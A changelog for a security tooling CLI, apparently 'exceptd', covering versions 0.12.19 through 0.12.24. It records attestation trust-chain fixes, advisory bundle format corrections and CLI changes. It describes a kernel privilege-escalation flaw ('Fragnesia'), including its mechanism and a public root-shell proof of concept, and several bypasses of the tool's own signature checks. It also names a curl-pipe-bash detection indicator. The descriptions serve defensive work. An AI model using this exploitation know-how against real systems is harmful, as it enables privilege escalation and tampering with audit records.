- **`runtime_errors[]` capped + per-kind deduped.** New helper `pushRunError(arr, entry, opts)` replaces 13 push sites. Per-kind cap defaults to 100; total cap 1000; overflow records as a `_truncated` sentinel. Closes the 39 MB worst-case attestation bloat under pathological catalog states.
- **`live_patch_tools[]` schema split.** New optional `vendor_update_paths[]` field separates true live-patch tools (kpatch, kGraft, Canonical Livepatch) from vendor-update mechanisms (npm yank, IDE update, package version pin). RWEP `live_patch_available` factor remains gated on the narrower `live_patch_tools[]`, so the score no longer over-credits vendor-update-only entries.

### CLI surface

- **`attest prune <session-id>` verb** removes an attestation session. Modes: `--force` (specific session), `--all-older-than <days> --force` (bulk), `--playbook <id>` (scoped), `--dry-run` (list without delete). Refuses `.` / `..` / all-dots ids and paths that resolve outside the attestation root.
- **Levenshtein flag-typo suggestions.** Unknown flags trigger a per-verb allowlist lookup; suggestions fire at edit distance ≤ 2 AND ≤ flag.length/2. `--evidnce ev.json` now sees `{ ok: false, error: 'unknown flag --evidnce', suggested: 'evidence' }`.
- **Missing-value detection.** Value-bearing flags that parsed as `true` (i.e. no value) emit `--<flag> requires a value`.
- **Help-text completeness.** `run`, `ai-run`, `ingest`, `run-all` help blocks document `--vex` / `--evidence-dir` / `--attestation-root` / `--mode`. `ai-run --help` adds an exit-code table (0/1/3/8/9). `ci --help` exit-code table corrected to omit 6/8 (cmdCi cannot emit them). Top-level `exceptd help` adds unknown-verb exit 2. `attest --help` documents `--since` under `list`; corrects `export --format` enumeration to match implementation.
- **`discover` / `ask`** document "always exits 0" so CI gates branch on JSON shape rather than exit code.

### Error-message UX

- **`dispatchPlaybook` catch-all, `cmdAiRun` runner-threw, `cmdLint` catch, `cmdReattest replay.reason` falsy path, `cmdRun` "no playbook resolved", `attest <subverb>` missing session-id** all wrap bare `e.message` with verb name + remediation hint pointing at the issue tracker.
- **Six sites of "playbook X has no directives"** consolidated into a shared helper.
- **JSON-mode stderr bypass sites** at `cmdRun` persist failure / `cmdIngest` persist failure / `cmdCi --format` validation route through `emitError` for consistent ok-false → exit-code mapping.

### Hard Rule #5 — global-first quality

- **`framework.json`** `framework_lag_declaration` rewritten with substantive per-framework gaps (NIST CA-7, EU NIS2 Art.21(2), UK CAF Principle A, AU Essential 8 Strategy 1, ISO/IEC 27001:2022 A.5.1). The meta-playbook now models the pattern instead of paper-name-dropping the frameworks.
- **`containers.json`** AU clause: E8 Strategy 1 Application Control bound to OPA/Kyverno privileged-pod admission (replaces the prior "Macro Settings by analogy" mismatch).
- **`crypto-codebase.json`** UK CAF C.5 + PSTI gap explicit: CAF mandates outcome-tested cryptography but doesn't require PQC-by-default / constant-time / KDF minima; PSTI scope is connected products only.
- **`library-author.json`** CAF C1.b + E8 Strategy 5 specific gaps (no SLSA L3+ provenance requirement; admin-privilege restriction doesn't reach build-time signing-key access).
- **`secrets.json`** adds NIST IA-5 with detection-of-credentials-in-source gap; E8 alignment shifts to Strategy 1 Application Control (restricting CI agent secret-store reads) instead of MFA (which static bearer tokens bypass). Adds 4 AU `per_framework_gaps[]` entries (Strategy 1 / Strategy 4 / ISM-1546 / ISM-1559) with compliance-theater tests embedded.
- **`hardening.json`** adds NIS2 Art.21(2)(c) + DORA Art.9(4) hardening-attestation gap.

### Operator-facing docs

- **`engines.node`** widened from `>=24.0.0` to `>=22.11.0`. Node 22 LTS through Apr 2027 is the corporate default; the prior pin excluded most enterprise installs.
- **Keywords** add `csaf-2.0`, `openvex`, `sarif`, `ed25519`, `provenance`, `attestation` (22 → 28 entries, alphabetised).
- **README install section** adds a "First run" snippet (`exceptd doctor --signatures` + fingerprint pin + npm provenance verify). New `agents/` description documents the markdown role-card scaffolding for skill authors.
- **`MAINTAINERS.md`** version-pinned subheadings collapsed into a single "High-trust skill paths" list.
- **Landing site (https://exceptd.com/)** refreshed: `softwareVersion: 0.12.24`, "35 jurisdictions" across every body-copy occurrence (was "34"), `exceptd plan` → `exceptd brief --all`, `exceptd scan` → `exceptd discover`, "13-gate predeploy" → "14-gate predeploy".

### Internal — test infra hardening

- **`tests/_helpers/snapshot-restore.js`** new helper. `withFileSnapshot([paths], async () => {...})` wraps mutation tests; restoration fires on normal completion, thrown error, SIGINT, SIGTERM, and `process.exit`. Closes the historical "smoke test mutates state, SIGINT skips finally, leaves polluted file on disk" class.
- **20+ coincidence-passing `notEqual(r.status, 0)` test sites pinned** to exact exit codes across `predeploy-gate-coverage`, `operator-bugs`, `build-incremental`, `refresh-swarm`, `orchestrator-audit-f`, `cli-coverage`, `prefetch`.
- **`scripts/check-test-coverage.js` predeploy gate extended** with a `coincidence-assert` ban: any new `assert.notEqual(*.status, *)` site fails the gate unless the same line carries `// allow-notEqual: <reason>`.
- **14 `audit-*-fixes.test.js` files renamed** to behavior-framed names (`runtime-errors-and-vex-disposition`, `attestation-trust-boundary`, `csaf-bundle-correctness`, `cli-flag-validation`, `playbook-runner-error-paths`, `framework-gap-completeness`, `rwep-scoring-edge-cases`, `cli-subverb-dispatch`, `openvex-emission`, `predeploy-gate-coverage`, `cli-exit-codes`, `playbook-schema-validation`, `attestation-signature-roundtrip`, `cve-catalog-shape`).
- **New coverage**: `cli-playbook-traversal.test.js`, `attest-verify-replay-isolation.test.js`, `cmd-run-multi-lock-contention.test.js`, `openvex-urn-routing.test.js`, `lib-exit-codes.test.js`, `lib-id-validation.test.js`, `lib-flag-suggest.test.js`.

## 0.12.23 — 2026-05-15

**Patch: doc-vs-code reconciliation, trust-chain pin loader hardening, attest list/show replay isolation, global-first framework coverage backfill.**

### Trust chain

- **`loadExpectedFingerprintFirstLine` refuses UTF-16LE / UTF-16BE pin files.** Saving `keys/EXPECTED_FINGERPRINT` via PowerShell `Set-Content -Encoding UTF16LE` (or any tool emitting a UTF-16 BOM) previously caused every consumer (verify, refresh-network, verify-shipped-tarball, attest pin) to decode the file as UTF-8 mojibake; the first line never matched a live fingerprint and operators saw no signal that the encoding was wrong. The loader now detects the FF FE / FE FF byte signatures, returns null, and routes through the existing "no-pin" warn-and-continue path so the error is surfaced without bricking the gate. UTF-8 and UTF-8-with-BOM remain supported.
- **`KEYS_ROTATED=1` override now emits a `process.emitWarning('EXCEPTD_KEYS_ROTATED_OVERRIDE', ...)`** at every site that accepts the bypass (`bin/exceptd.js` attestation pin, `lib/refresh-network.js` refresh-network swap gate). Previously the env var was a silent skip; operators who set it once for a legitimate rotation and forgot to commit the new pin had no surface signal on subsequent runs. The mismatch values are echoed in the warning so log scrapers can confirm intended rotation. `lib/verify.js` and `scripts/verify-shipped-tarball.js` already emitted warnings at this gate and are unchanged.

### Engine + CLI

- **`attest list` and `attest show` filter `kind: 'replay'` records out of the session attestations array.** v0.12.22 added signed `replay-<iso>.json` audit records under `.exceptd/attestations/<sid>/`, which the listing/show loops were treating as additional sessions (or duplicate attestation entries) with `evidence_hash: null` and `captured_at: null`. Records are now partitioned by parsed `kind` field — replay records appear under a new `attestation_replays[]` array on `attest show` output and are omitted entirely from `attest list`. Gating on the parsed `kind` field (not filename prefix) closes the rename-smuggle vector.
- **`--session-id .` / `..` / all-dots refused after regex pass.** The `/^[A-Za-z0-9._-]{1,64}$/` validator accepted any string of dots, which resolved into or above the attestation root. The CLI now explicitly refuses all-dots session ids with a structured error.

### Help text and exit-code surface

- **`ingest`, `ai-run`, and `run-all` help blocks document `--csaf-status` and `--publisher-namespace`.** v0.12.22's `BUNDLE_FLAG_RELEVANT_VERBS` set wired the flags into all five bundle-emitting verbs but only the `run` and `ci` help blocks listed them; operators on the other three verbs had to read the source to find them.
- **Exit-code tables completed across the help surface.** Top-level `exceptd help` for `ci` now lists 0/1/2/3/4/5/6/8 instead of 0/2/3/4/5/1. Per-verb tables for `ci`, `attest verify`, and `reattest` now document `6 — TAMPERED` and `8 — LOCK_CONTENTION` where applicable. `run --help` adds a `6-7 — reserved` line so the gap doesn't read as accidental.

### Hard Rule #5 — global-first coverage

- **Eleven playbooks backfilled with UK CAF + AU Essential 8 / ACSC / ISM clauses** in `phases.direct.framework_lag_declaration` (`secrets`, `ai-api`, `containers`, `cred-stores`, `crypto`, `kernel`, `mcp`, `runtime`, `sbom` — both CAF and E8 added; `crypto-codebase` — E8 added on top of existing CAF; `hardening` — CAF added on top of existing E8). The v0.12.21 entry claimed this coverage was already in place; only `framework.json` and `library-author.json` actually had it. All 13 playbooks now declare CAF + E8 framework-lag posture alongside NIST and ISO.

### Operator-facing docs

- **README, AGENTS.md, ARCHITECTURE.md, and CONTEXT.md reconciled with the v0.11+ canonical CLI surface.** The deprecation banner heading on legacy v0.10.x verbs now states "scheduled for removal in v0.13" (not "removed in v0.12" — the verbs remain registered with deprecation warnings). README body examples replace `exceptd verify` / `exceptd scan` / `validate-cves` / `validate-rfcs` with `exceptd doctor --signatures` / `exceptd discover` / `doctor --cves` / `doctor --rfcs`. AGENTS.md CLI reference table replaces the stale v0.10.x verb set (`plan`/`govern`/`direct`/`look`/`ingest`/`reattest`/`list-attestations`) with the v0.11+ canonical surface (`brief`/`run`/`ai-run`/`run-all`/`ci`/`discover`/`ask`/`reattest <sid>`/`attest verify|list|show`/`doctor`/`lint`). CONTEXT.md catalog inventory aligned with actual catalog state (10 CVE, 62 framework-control-gap, 35 jurisdictions, 55 CWE, 28 D3FEND, 31 RFC, 22 DLP entries) and a new "Playbooks and the Seven-Phase Contract" section enumerates the 13 playbooks and the govern → direct → look → detect → analyze → validate → close contract.
- **Predeploy gate count corrected from "15" to "14"** across AGENTS.md, ARCHITECTURE.md, and README. The predeploy gate set ships 14 gates per `scripts/predeploy.js`; the "15th" framing was an off-by-one carryover from an earlier draft of the diff-coverage gate that landed as the 13th rather than appended. The diff-coverage gate position is also corrected from "14th" to "13th" in AGENTS.md Hard Rule #15 and ARCHITECTURE.md (the validate-playbooks gate sits at position 14).
- **AGENTS.md CLI reference table now lists `brief --all` and `attest diff <sid>`** as canonical, with `plan` and `reattest` marked as deprecated aliases scheduled for removal in v0.13 (consistent with how the v0.10.x `govern`/`direct`/`look` verbs are surfaced).
- **AGENTS.md "Seven-phase playbook contract" intro** drops the "direct CLI verbs are landing in a follow-up task" prose — the verbs landed in v0.11.0. Points readers at `exceptd brief` / `exceptd run` / `exceptd ai-run` plus the library entry point at `lib/playbook-runner.js`.
- **CONTEXT.md phase-contract table** now references `exceptd brief <playbook> --phase {govern,direct,look}` for phases 1-3 (was `exceptd govern|direct|look`); the "How to Walk a Playbook" onboarding section is rewritten against the same canonical surface.
- **ARCHITECTURE.md CWE entry count** corrected from 51 to 55 (matches `data/cwe-catalog.json` and CONTEXT.md).
- **Jurisdiction count corrected from "37" / "34" to "35"** in the README badge, status copy, and catalog footnote. `data/global-frameworks.json` has 38 top-level keys but three are `_meta` / `_notification_summary` / `_patch_sla_summary` aggregates; the actual jurisdiction count is 35.

### Operations

- **`.github/workflows/atlas-currency.yml` declares `permissions:` at the job level** instead of the workflow root. Matches the project's OpenSSF Scorecard `TokenPermissionsID` posture (job-scoped least-privilege); top-level permission grants were the only remaining outlier across the repo's workflow set.

### Internal

- **Internal code comments stripped of stray maintenance-tracking tokens (no behavior change).**
- **Exit-code assertion in the UTF-16BE odd-length-payload test tightened** from `notEqual(r.status, 0)` to `assert.equal(r.status, 1)` per project anti-coincidence rule.

## 0.12.22 — 2026-05-15

## 0.12.22 — 2026-05-15

**Patch: trust-chain attestation sidecar redesign, CSAF spec-compliance fixes, CLI flag scoping, concurrency exit-code surface.**

### Trust chain

- **`.sig` sidecar shape reduced to signed-bytes only.** The previous shape carried `signed_at`, `signs_path`, and `signs_sha256` alongside the Ed25519 signature — but those fields were NOT covered by the signature (the signature signs the attestation file bytes, not the sidecar). An attacker who captured any valid sidecar could rewrite `signed_at` to lie about freshness or `signs_path` to point at a sibling attestation in the same session directory, and the signature still verified. Sidecar now carries `{algorithm, signature_base64, note}` (signed) or `{algorithm, signed: false, note}` (unsigned) only. Operators reading freshness use filesystem mtime; the attestation file's own `captured_at` field is signed.
- **`cmdReattest --force-replay` persists the override as a signed `replay-<isoZ>.json`** in the session directory alongside `attestation.json`. The previous shape emitted the override metadata only to stdout, so the audit trail vanished when the shell closed. `attest verify <session-id>` surfaces both the original attestation and any replay records so an auditor sees the full chain.
- **Sidecar verifier enforces `algorithm === 'Ed25519'` strictly.** Both `verifyAttestationSidecar` and `cmdAttest verify` previously fell through to `crypto.verify` for any non-`"unsigned"` algorithm value. A `null`, `"RSA-PSS"`, array, or omitted-field sidecar now surfaces `tamper_class: 'algorithm-unsupported'` and exits 6. Matches the strict gate already in place at `verifyManifestSignature`.
- **`hasReadableStdin` Windows fallback tightened to strict `=== false`** to close the wrapped-test-harness hang regression. The helper now requires `process.stdin.isTTY === false` (not falsy) on Windows when fstat reports size 0 on a non-FIFO non-socket non-character descriptor. POSIX pipes/FIFOs/sockets remain trusted via the `isFIFO()`/`isSocket()`/`isCharacterDevice()` probes added in v0.12.21.
- **`keys/EXPECTED_FINGERPRINT` pin loaders strip UTF-8 BOM.** Four sites (`bin/exceptd.js`, `lib/verify.js`, `lib/refresh-network.js`, `scripts/verify-shipped-tarball.js`) now share a single `loadExpectedFingerprintFirstLine` helper that strips a leading `U+FEFF` before splitting on newlines. A pin file saved via Notepad with `files.encoding: utf8bom` previously broke every verify path; the helper closes that DoS-by-encoding-roundtrip class.
- **`sanitizeOperatorText` (library entry point) NFC-normalizes and rejects Unicode `\p{C}`** (Cc/Cf/Cs/Co/Cn). The CLI-level guard added in v0.12.21 only fired on operator-supplied `--operator` input; library callers of `buildEvidenceBundle` bypassed the sanitization. The helper now uniformly returns null for inputs containing bidi-control / zero-width / surrogate / private-use / unassigned characters or empty-after-strip, and caps at 256 codepoints (not 256 UTF-16 code units, so astral-plane characters don't smuggle past).

### Bundles (CSAF / SARIF / OpenVEX)

- **CSAF `cvss_v3` block emitted only for `CVSS:3.0` / `CVSS:3.1` vectors.** Catalog entries carrying `CVSS:2.0/` or `CVSS:4.0/` vectors previously produced a `cvss_v3.version` of `'2.0'` / `'4.0'`, which violates the CSAF 2.0 schema enum `["3.0", "3.1"]`. Strict validators (BSI CSAF Validator) rejected the bundle. The block is now omitted for non-v3 vectors and a `bundle_cvss_v3_version_unsupported` runtime warning surfaces in `analyze.runtime_errors[]` so operators see the gap.
- **CSAF `vulnerabilities[].ids[]` routes `RUSTSEC-*` to `system_name: 'RUSTSEC'`**. Previously RUSTSEC advisories fell through to `system_name: 'OSV'` — mis-attributing the authority. Unknown prefixes (any advisory id not in the GHSA / MAL / OSV / SNYK / RUSTSEC set) now emit `system_name: 'exceptd-unknown'` so downstream tooling sees the authority wasn't recognized.
- **Non-string `cve_id` no longer emits literal `"null"` text.** Catalog entries whose `cve_id` is `null` / `undefined` / non-string are now omitted from `vulnerabilities[]` entirely, with a `bundle_cve_id_missing` runtime warning. Strict validators no longer see ghost vulnerabilities keyed on `text: "null"`.

### CLI

- **`--csaf-status` and `--publisher-namespace` refused on info-only verbs**. The flags were previously validated then silently dropped when invoked against `brief`, `list`, `attest`, `discover`, `doctor`, `lint`, etc. — same UX-trap class as the v0.12.21 `--ack` fix. The flags now refuse with a structured error pointing at the verb set that actually consumes them (`run`, `ci`, `run-all`, `ai-run`). Error messages also use the actual invoked verb as the prefix instead of a hardcoded `"run:"`.
- **`cmdRunMulti` consent gate now per-playbook**. The single-playbook `cmdRun` correctly gates `operator_consent` persistence on `classification === 'detected'`, but `cmdRunMulti` was persisting consent unconditionally across every iteration regardless of the iteration's own classification. Per-playbook consent gating now mirrors the single-run shape; mixed-classification `run-all --ack` runs persist consent only into the detected-playbook attestations.
- **UTF-16BE `readJsonFile` no longer leaks uninitialized buffer bytes.** The decoder used `Buffer.allocUnsafe` (uninitialized heap memory) and silently skipped the trailing byte on odd-length payloads — the decoded string then included whatever bytes happened to be on the heap at allocation time. Now uses `Buffer.alloc` (zero-initialized) and refuses odd-length payloads with a clear truncation error.
- **`run` and `ci` help text documents `--csaf-status` and `--publisher-namespace`**.

### Concurrency

- **`persistAttestation` lock contention exits 8 (`LOCK_CONTENTION`)** distinct from generic exit 1. The v0.12.21 entry claimed callers could distinguish lock-busy from hard failure via the `lock_contention: true` field, but `emit()`'s auto-mapping collapsed the exit code to 1. The function now sets `process.exitCode = 8` before returning, with `exit_code: 8` echoed in the result body. Exit-code table in `run --help` documents the code.
- **`acquireLock` reclaims same-PID stale lockfiles** older than 30 seconds. The previous PID-liveness probe skipped reclaim when the lockfile's recorded PID matched the current process's PID — but a same-process leak across multiple `run()` invocations left the lockfile orphaned indefinitely. The mtime-staleness check now allows reclaim while preserving legitimate reentrancy on fresh same-PID lockfiles.

### Test quality

- **5 exit-code assertions tightened from `notEqual(r.status, 0)` to exact-value `assert.equal(r.status, 1)`** across the CSAF and CLI-flag regression suites. Closes the same coincidence-passing-tests regression the v0.12.21 entry's tightening pass left half-done.
- **CVE-curation tests no longer mutate `data/cve-catalog.json`** in the repo root. Three tests previously injected synthetic `CVE-9999-*` drafts into the live catalog with a `finally{}` restore — a Ctrl-C between mutation and restoration leaked state into the repo. The refresh tests now use the existing `--catalog <path>` flag against a tempdir copy; the validate test uses the in-process module API directly.
- **Three e2e expect.json files** (`14-framework-jurisdiction-gap`, `16-containers-root-user`, `19-crypto-rsa-2048-eol`) now assert `phases.close.jurisdiction_notifications[0].jurisdiction` is populated. Field-presence-without-content was the previous shape.

### Catalog + skill content

- **`data/playbooks/runtime.json domain.cve_refs[]`** completes the Dirty-Frag family by adding `CVE-2026-43284` and `CVE-2026-43500` (already referenced by `kernel.json` and `hardening.json`).
- **`skills/threat-model-currency/skill.md`** inline `last_threat_review` date aligned to frontmatter (`2026-05-14`).

## 0.12.21 — 2026-05-14

**Patch: Fragnesia (CVE-2026-46300) catalog + skill integration; trust-chain bypass closures; engine FP-gate extension; CSAF + SARIF + OpenVEX correctness; CLI fuzz; Hard Rule #5 global-first coverage; predeploy regression fix.**

### Catalog — Fragnesia

`CVE-2026-46300` (Fragnesia) added — a Linux kernel local privilege escalation disclosed 2026-05-13 by William Bowling / V12 security team. CVSS 7.8 / AV:L. The flaw is in the kernel XFRM ESP-in-TCP path: `skb_try_coalesce()` fails to propagate `SKBFL_SHARED_FRAG` when transferring paged fragments between socket buffers. An unprivileged user can deterministically rewrite read-only page-cache pages without modifying on-disk bytes — no race condition required. A public proof-of-concept demonstrates root shell via `/usr/bin/su`. Mitigation: blacklist or unload `esp4`, `esp6`, `rxrpc` kernel modules (the same set already documented for CVE-2026-31431); AlmaLinux + CloudLinux ship patched kernels in testing; live-patch is available via Canonical Livepatch, kpatch, kGraft, and CloudLinux KernelCare. RWEP today: 20 (will jump to 45 on CISA KEV listing).

The `kernel`, `runtime`, and `hardening` playbooks now reference Fragnesia in `domain.cve_refs[]`. Six skills carry cross-references: `kernel-lpe-triage`, `exploit-scoring`, `compliance-theater`, `framework-gap-analysis`, `zeroday-gap-learn`, `threat-model-currency`. `data/zeroday-lessons.json` adds three new control requirements that codify the lesson: page-cache integrity verification (file-integrity tools hashing on-disk bytes miss this class), bug-family mitigation persistence (operators who blacklisted modules for the parent bug remain mitigated for the sequel), and scanner paper-compliance test (a "patched" vulnerability-scanner report based on kernel-package version misses the module-unload mitigation surface).

### Trust chain

- **`algorithm: "unsigned"` sidecar substitution closed**. An attacker with write access to the attestation directory previously bypassed signed-tamper detection by overwriting `.sig` with `{"algorithm":"unsigned"}`. `attest verify` now refuses with exit 6 + `ok:false` when the substitution shape is detected on a host that has a private key present (legitimate unsigned attestations remain serviceable only on hosts where signing is intentionally disabled). `cmdReattest` requires explicit `--force-replay` to replay an explicitly-unsigned attestation regardless of host state; the persisted replay body records `sidecar_verify_class` and `force_replay: true`.
- **Corrupt-sidecar `.sig` JSON parse bypass closed**. Previously `cmdReattest` refused only on `reason === "no .sig sidecar"`; a truncated or malformed sidecar fell through to the benign branch. The refusal class now covers any non-clean verify reason. `cmdAttest verify` also wraps the sidecar `JSON.parse` so a corrupt sidecar exits 6 (TAMPERED) rather than exit 1 (generic).
- **`EXPECTED_FINGERPRINT` consulted inside `verifyManifestSignature`**. The pin previously fired only at the CLI tail; library callers (refresh-network gate, verify-shipped-tarball gate, tests, downstream consumers) bypassed it. The pin now gates manifest-envelope authentication at every load site. Honors `KEYS_ROTATED=1`; missing pin file remains warn-and-continue.

### Engine

- **Classification-override block extended to all override values**. The previous gate refused only `'detected'` overrides when an indicator with `false_positive_checks_required[]` was unsatisfied. An agent submitting `'clean'` or `'not_detected'` previously hid hits under a falsely-clean run verdict — strictly worse than the false-positive case the gate was meant to prevent. The substitution now applies to every override (`'detected' | 'clean' | 'not_detected' | 'inconclusive'`): when any indicator has unsatisfied FP checks, classification is forced to `'inconclusive'`. The `classification_override_blocked` runtime error records the offending indicator IDs and the count of unsatisfied checks (the literal check-name strings are no longer disclosed — they had been an attestation-bypass hint).
- **`vex_status: 'fixed'` propagation closed end-to-end**. The runner's bundle gates (CSAF `product_status: fixed` / OpenVEX `status: fixed`) previously never fired on operator runs: the `--vex` CLI consumed `vexFilterFromDoc()` for the `vex_filter` set but never read the `.fixed` companion property. The CSAF + OpenVEX `fixed` semantics introduced in v0.12.19 now actually engage when an operator submits a CycloneDX `analysis.state: resolved` or OpenVEX `status: fixed` statement.
- **`normalizeSubmission` flat-submission runtime errors reach `analyze.runtime_errors[]`**. The v0.12.19 promise to surface `signal_overrides_invalid` errors in the analyze phase was silently incomplete for flat-shape submissions (`{observations, verdict, signal_overrides}`); the constructed `out` object dropped the `_runErrors` accumulator. Errors are now threaded through both submission shapes.
- **Off-allowlist `detection_classification` values surface a runtime error**. `'present'`, `'unknown'`, `''`, case variants, leading/trailing whitespace, and other non-allowlist strings previously failed silent. They now push `classification_override_invalid` onto `runtime_errors[]`.
- **Proxy-throwing FP attestation no longer crashes detect()**. A malicious attestation whose getter throws is now caught: the indicator verdict downgrades to `'inconclusive'`, every required FP check is treated as unsatisfied, and a `fp_attestation_threw` runtime error records the indicator ID.

### Bundles (CSAF / SARIF / OpenVEX)

- **CSAF `tracking.status: 'interim'`** is the default for runtime emissions. `'final'` is an immutable-advisory marker; runtime detections without an operator review loop don't qualify. Operators promote to `final` via `--csaf-status final` after review. Strict validators (BSI CSAF Validator, Secvisogram) no longer refuse the bundles.
- **CSAF non-CVE identifiers routed correctly**. Per CSAF 2.0 §3.2.1.2 the `cve` field requires a strict CVE-ID shape. `MAL-2026-3083`, GHSA-*, RUSTSEC-* identifiers are now emitted under `ids: [{system_name, text}]` instead of misappropriating the `cve` field. Validators no longer reject the document.
- **CSAF `document.publisher.namespace`** now derives from `--publisher-namespace <url>` (new CLI flag) or, when omitted, from `--operator` if it parses as a URL. Without either, the bundle emits `urn:exceptd:operator:unknown` and pushes a `bundle_publisher_unclaimed` runtime warning. Operators are no longer misattributed to the tool vendor's marketing domain.
- **CSAF `document.tracking.generator`** populated with the exceptd engine + version; `publisher.contact_details` carries the validated `--operator` value when supplied.
- **`bundles_by_format` always populated**. The field was previously `null` when only the primary format was requested; multi-format-aware consumers had to special-case the no-extras shape.
- **CSAF `cvss_v3` block requires `vectorString`**. Per the CVSS v3.1 schema referenced by CSAF, the vector is mandatory. The block is now omitted when the vector is unavailable rather than emitting a partial structure that downstream tooling would reject.
- **SARIF `ruleId` prefixed with `<playbook-slug>/`**. Multi-playbook runs no longer collide on rule IDs (`framework-gap-0` from kernel-lpe and `framework-gap-0` from crypto-codebase are now distinct in GitHub Code Scanning dashboards).

### CLI

- **Stdin auto-detect uses `fstatSync` size probe** at `cmdRun`, `cmdIngest`, and `cmdAiRun --no-stream`. The previous truthy `!process.stdin.isTTY` check hung indefinitely on wrapped streams where `isTTY` was undefined but no data was piped (Mocha/Jest test harnesses, some Docker stdin-passthrough modes). The auto-detect now skips stdin when fstat reports size 0 on a non-TTY descriptor.
- **`--vex` accepts CycloneDX SBOMs without `vulnerabilities[]`**. A document with `bomFormat: "CycloneDX"` and no vulnerabilities array is now read as a zero-CVE VEX filter rather than refused. Operators with legitimate "no known vulnerabilities" SBOMs can now thread them through.
- **`--vex` and `--evidence` tolerate UTF-8 / UTF-16 BOMs**. A new shared `readJsonFile` helper detects the BOM (`FF FE` / `FE FF` / `EF BB BF`), decodes accordingly, strips the residual code point, and surfaces clean parse errors. Windows-generated CycloneDX documents (which routinely emit UTF-16LE or UTF-8 BOM) now parse correctly.
- **`--vex` enforces a 32 MiB size cap** with a clear error message (`exceeds 32 MiB limit (33,554,432 bytes)`).
- **`--operator` rejects Unicode bidi / format / control characters**. NFC-normalized input is validated against an allowlist that excludes Unicode general categories `Cc` (control), `Cf` (format — RTL override, zero-width, etc.), `Cs`, `Co`, `Cn`. Operator-identity forgery via right-to-left override or Zalgo is closed.
- **`--evidence-dir` refuses symbolic links, Windows directory junctions, and surfaces a warning on hardlinks**. The previous `lstatSync().isSymbolicLink()` gate missed Windows reparse-point junctions (which Node treats as directories) and gave no signal on hardlinked entries. A `realpathSync` check now enforces containment under the resolved directory; `nlink > 1` emits a defense-in-depth stderr warning.
- **`--ack` refused on non-clock verbs**. `brief`, `list`, and similar info-only verbs that don't engage jurisdiction-clock semantics now refuse the flag with a clear "irrelevant on this verb" error. On `run`, `--ack` is consumed only when classification is `'detected'`; on a `not_detected` run, consent persistence is skipped and `ack_skipped_reason` is surfaced.
- **`--help` text scrubbed**. The `ai-run` subverb help no longer carries internal-process vocabulary.

### CLI flag additions

- **`--csaf-status <interim|final>`** controls CSAF emission status.
- **`--publisher-namespace <url>`** sets the CSAF `document.publisher.namespace` field.

### Auto-discovery + curation

- **KEV-discovered draft predeploy regression closed**. `scoring.validate()` previously flagged every newly-imported KEV draft as score-diverged (the `buildScoringInputs` shape sets `poc_available: true` for the contribution while `buildKevDraftEntry` stores `null` on the draft for review). The validator now skips entries flagged `_auto_imported: true`; promoted entries are validated normally.
- **`--air-gap` CLI flag wired through `refresh-external`**. The flag was previously accepted only via `EXCEPTD_AIR_GAP=1` env. Both the `parseArgs` and `loadCtx` paths now thread `--air-gap` into `ctx.airGap`; GHSA + OSV diff applicators correctly skip network calls.
- **`cross-ref-api.byCve()` filters out auto-imported drafts by default**. An optional `{ include_drafts: true }` opt-in is available for the curation questionnaire path. Bundles, analyze, and other operator-facing surfaces no longer treat unreviewed drafts as authoritative.

### Concurrency

- **`cross-ref-api` cache invalidates on file mtime change**. The previous process-lifetime cache meant a long-running `orchestrator watch` process never observed catalog updates applied by an out-of-band `refresh-external --apply`. Each `loadCatalog` / `loadIndex` call now compares the cached mtime against `fs.statSync`; mismatch re-parses.
- **`persistAttestation --force-overwrite` retry cap reduced** from 50 to 10 (~1 second worst-case event-loop block under attestation contention, down from ~10 seconds). Failure returns include a `lock_contention: true` sentinel + `LOCK_CONTENTION:` error prefix so callers can distinguish lock-busy from hard failure. An async refactor of `persistAttestation` and its call sites is a v0.13.0 candidate.
- **`acquireLock` (playbook-runner) probes PID liveness on EEXIST**. Previously a stale-PID lockfile caused `acquireLock` to return null silently; callers proceeded unlocked. The function now parses the lockfile PID, calls `process.kill(pid, 0)`, reclaims on `ESRCH`, and returns a structured diagnostic when the lock is held by a live process.

### CI workflows

- **Top-level `permissions: contents: read`** added to `.github/workflows/release.yml` and `.github/workflows/refresh.yml`. Per-job blocks retain their elevated scopes. Closes outstanding Scorecard `TokenPermissionsID` alerts.

### Tests

- New regression coverage for every closure above.
- Coincidence-passing-test cleanup: exit-code assertions tightened from `notEqual(r.status, 0)` to exact-value `assert.equal(r.status, <code>)`; classification assertions pinned to expected enum values.
- `doctor --fix is registered` rewritten as a non-mutating `--help` probe; the previous shape staged a dummy `.keys/private.pem` in the real repo root, replicating the v0.12.4 incident anti-pattern.

### Skill content

- `webapp-security` skill — `CVE-2025-53773` CVSS aligned to catalog (`7.8 / AV:L`, was `9.6`).
- `kernel-lpe-triage` skill — `CVE-2026-31431` KEV listing date aligned to catalog (`2026-05-01`, was `2026-03-15`).

### Hard Rule #5 (global-first) coverage

UK CAF + AU Essential 8 / ISM entries added to the framework-control-gap declarations across 10 playbooks (`kernel`, `mcp`, `ai-api`, `crypto`, `sbom`, `runtime`, `cred-stores`, `secrets`, `containers`, `hardening`). NIS2 Art. 21 + DORA Art. 9 added to `hardening` and `containers`. Each entry follows the existing schema shape; the gold-standard templates from `framework`, `crypto-codebase`, and `library-author` remain the reference.

## 0.12.20 — 2026-05-14

**Patch: e2e scenarios attest FP checks for indicators that the v0.12.19 classification-override block now forces to `inconclusive` when unattested.**

The v0.12.19 engine change blocks `detection_classification: 'detected'` agent overrides when ANY indicator with `false_positive_checks_required[]` fires without operator attestation. Five e2e scenarios asserting `classification: detected` were submitting FP-required indicator hits without attestations, so the runner correctly downgraded them. The scenarios now attest the FP checks:

- `09-secrets-aws-key`: attest `aws-secret-access-key` (3 checks)
- `10-kernel-copy-fail`: attest `unpriv-userns-enabled` (2 checks)
- `14-framework-jurisdiction-gap`: attest `exception-missing-expiry-or-owner` + `jurisdiction-without-framework` (2 + 2)
- `16-containers-root-user`: attest `dockerfile-curl-pipe-bash` (3 checks; `dockerfile-runs-as-root` was already attested)
- `19-crypto-rsa-2048-eol`: attest `openssl-pre-3-5` + `ml-dsa-slh-dsa-absent` (3 + 3)

v0.12.20 ships the v0.12.19 trust-chain + engine + bundle + concurrency closures plus the scenario updates.

## 0.12.19 — 2026-05-14

**Patch: trust-chain hardening across attestation verify + refresh-network + verify-shipped-tarball; engine FP-bypass closures; bundle correctness; concurrency safety; KEV-draft promotability; README CVSS correction.**

### Trust chain

- **`attest verify` returns exit 6 + `ok:false` on TAMPERED**. The subverb previously emitted `{verb, session_id, results}` without `ok:false` when any sidecar failed verification — the `emit()` auto-exitCode contract only fires on `ok:false`, so a tampered attestation passed exit 0. CI gates and shell pipelines now see the correct failure signal.
